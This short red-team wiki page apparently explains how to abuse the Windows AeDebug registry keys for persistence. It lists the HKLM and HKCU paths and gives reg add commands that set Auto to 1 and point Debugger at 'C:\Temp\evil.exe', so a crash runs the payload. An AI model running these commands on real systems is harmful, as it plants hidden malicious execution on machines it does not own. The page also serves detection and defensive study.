# AEDebug Keys

## Theory

The executable in the Debugger property is run when a process crashes. Gained access depends on whose context the debugged process runs in; if the Auto property of the same registry key is set to 1, the debugger starts without user interaction.

{% hint style="info" %}
&#x20;A value of `C:\Windows\system32\vsjitdebugger.exe` might be seen if you have Visual Studio Community installed.
{% endhint %}

## Practice

{% hint style="success" %}
Registry entries under `HKU/HKCU` will only apply to the user.\
Registry entries under `HKLM` will apply to everyone
{% endhint %}

{% tabs %}
{% tab title="AeDebug" %}
You can run a malicious code instead of the debugger by editing `Auto` and `Debugger` values under following keys:

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`
* `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`

```powershell
# Starts without user interaction
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /d 1
# Edit debugger
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /d "C:\Temp\evil.exe"

#Or

# Starts without user interaction
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /d 1
# Edit debugger
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /d "C:\Temp\evil.exe"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/" %}
